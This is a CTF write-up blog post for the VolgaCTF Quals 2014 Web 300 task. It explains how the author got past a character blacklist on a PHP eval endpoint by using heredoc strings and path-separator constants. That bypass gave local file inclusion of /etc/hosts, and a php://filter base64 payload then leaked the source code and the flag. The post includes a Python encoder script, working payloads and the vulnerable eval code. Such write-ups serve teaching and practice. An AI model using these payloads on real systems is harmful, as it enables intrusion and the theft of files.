---
layout: post
title:  "VolgaCTF Quals 2014 Web 300"
date:   2014-04-04
categories: writeups volgactf quals 2014 web 300
author: hx
comments: true
---

In this task we have a script at *[http://tasks.2014.volgactf.ru:28103/](http://tasks.2014.volgactf.ru:28103/)* that
accepts GET parameter *e* looking like a command. If command is valid, a result will be printed, otherwise we will get a blank
page. The first question - what language this command is written on?
<!-- more -->

From the task's hint I found that command *echo pi* is valid. I tried to experiment and have found another valid command
*print pi*. I knew only one language accepting both of this commands - PHP. This guess looked good because the page on the
site was written on PHP (it's possible to append *index.php* to the page URL).

I've googled that there is no constant named *pi* in PHP (there is *M_PI* constant instead of it), but there is
[*pi()* function](https://secure.php.net/manual/en/function.pi.php). Therefore I've guessed that characters *();* are appended to the executed line. The assumption was correct because [*phpinfo* command](http://tasks.2014.volgactf.ru:28103/?e=phpinfo) was transformed to
*phpinfo();* call.

I understood that it's possible to execute a code on the server, but I faced a problem - some symbols were filtered. When I was
testing what symbols were filtered I supposed that writing the URL address in a browser is really uncomfortable because some characters
such as *+* and *%* weren't encoded and behave in a wrong way. So I decided to encode them and send requests to the site
using [ipython](http://ipython.org/).

For instance, these lines of code proves that comma is removed from the command (otherwise the comma would be inserted into word *pi* and broke the code):

{% highlight python %}
In [1]: import urllib

In [2]: print urllib.urlopen('http://tasks.2014.volgactf.ru:28103/?' + urllib.urlencode({'e': 'echo p,i'})).read()
3.1415926535898
{% endhighlight %}

So, I've found out that this special symbols are banned:
{% highlight php %}
` ' " $ # * ^ : ; ( ) > / \
{% endhighlight %}

At the same time letters, digits and other special symbols, including the newline character, were allowed.

It wasn't clear how to execute a useful code in these conditions. At first sight, we aren't able to send string constants at
all. But we can remember heredoc-style string constants:

{% highlight php %}
$str = <<<EOF
string content
EOF;
{% endhighlight %}

That's equivalent to:

{% highlight php %}
$str = "string content";
{% endhighlight %}

In this case we can use such constants because *<* character and the newline are available to us. Also it's important that we can concatenate strings using the dot.

Characters */* and *:* are necessary for sending paths to files and URLs. We can take these symbols from magic constants like *\_\_DIR\_\_*, but in PHP < 5.5 it's possible to get a character from a string by index only if the string kept in a variable (this behavior seems quite strange for me). According *phpinfo()*, the server
had PHP 5.4, and we can't use variables because character *$* is prohibited.

I often use Python, so I suggested that there's a constant in PHP similar to Python's *os.path.sep* (a constant that contains a directory separator in paths, usually */* or *\\*). Fortunately, it appeared that such constant really exists in PHP and named
*DIRECTORY_SEPARATOR*. The similar constant containing the colon named *PATH_SEPARATOR*
([docs](http://www.php.net/manual/en/dir.constants.php)).

The next question is how to use the defined strings. The parentheses are prohibited on the server, so we can't call functions, but we can use language constructions like *include* or *require* to read files.

The other task is to neutralize empty brackets appended to the command by the server. It can be solved by concatenation with the
result of *printf* function without arguments. In general, this function can't be called without arguments. Nevertheless, the
interpreter just will print a warning in this case and won't stop script execution. The function returns an empty string, so the concatenation won't have any impact on the obtained string.

All these tricks allow us to use LFI (Local File Inclusion) vulnerability. We can include local files using a path encoded with heredoc-style constants and constants like *DIRECTORY_SEPARATOR*. For example, to view */etc/hosts* file we need to send the following command to the server:

{% highlight php %}
include DIRECTORY_SEPARATOR.<<<EOF
etc
EOF
.DIRECTORY_SEPARATOR.<<<EOF
hosts
EOF
.printf
{% endhighlight %}

The server have added characters *();* to this command, so it became equivalent to the following:

{% highlight php %}
include "/etc/hosts".printf();
{% endhighlight %}

During inclusion of */etc/hosts*, a PHP interpreter won't find any PHP code and will simply print contents of this file. Now we can read local files if they don't contain PHP code. The next question - where is the flag?

I thought that it is necessary to check possibility of RFI (Remote File Inclusion). For this purpose I tried to include link like
*http://example.com/*. For convenience I wrote the following script on Python, which encodes the necessary command and
receives its result:

{% highlight python linenos=table %}
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import re
import urllib

def heredoc(str):
    return ' <<<EOF\n%s\nEOF\n' % str

def encode_path(str):
    encoded = re.sub(r'[a-zA-Z0-9.-]+',
                     lambda match: heredoc(match.group()) + '.',
                     str)
    encoded = encoded.replace('/', 'DIRECTORY_SEPARATOR.')
    encoded = encoded.replace(':', 'PATH_SEPARATOR.')
    return encoded

encoded_path = encode_path('http://volgactf.ru/news/nachalobeginning')
params = urllib.urlencode({'e': 'include %sprintf()' % encoded_path})
print urllib.urlopen('http://tasks.2014.volgactf.ru:28103/?' + params).read()
{% endhighlight %}

Unfortunately, the attempt of RFI failed (the server returned an empty line on a correct request). This failure gave me a wrong idea that if HTTP protocol isn't processed, then *allow_url_include = off* and no URL protocols are processed at all.

I tried to find the file containing the flag. Popular paths like */home/volga/flag* weren't suited, so I tried to
upload a PHP shell to explore contents of various directories. Despite the LFI, it was impossible to upload the shell because writeable files weren't found: I found a configuration of Apache but files with logs weren't readable as well as  descriptors of the current process in */proc/self/fd/*.

Here my friend *Phil9l* advised me to look for the flag in a source code of *index.php*, because the flag often located there in similar tasks. It was impossible to include the source code of the script
directly, but it appeared that the directive *allow_url_include = off* doesn't forbid *php://* URL usage ([docs](https://secure.php.net/manual/en/wrappers.php.php)).

So, we can use *php://filter/* URLs to receive local files in different encodings. For example, with *php://filter/convert.base64-encode/* we can encode file to Base64
([docs](https://secure.php.net/manual/en/filters.convert.php)). Then the script won't be executed, and it's possible to
decode its source code from Base64. Let's retrieve *index.php* source with the following command:

{% highlight php %}
include 'php://filter/convert.base64-encode/resource=index.php';
{% endhighlight %}

There's no problem to encode this URL with the Python script above and execute it on the server. After decoding we will see the following source:

{% highlight php %}
<?
sleep(1);
$f= $_GET['e'];
$f = str_replace(array('`','$','*','#',':','\\','"','(',')','>','\'','/','^',';'),'', $f);
die(@eval("$f();"));

FLAG?: OUR_WEBBA_IS_A_LAZY_DOUCHEBAG;
{% endhighlight %}

So, the flag is **OUR_WEBBA_IS_A_LAZY_DOUCHEBAG**.
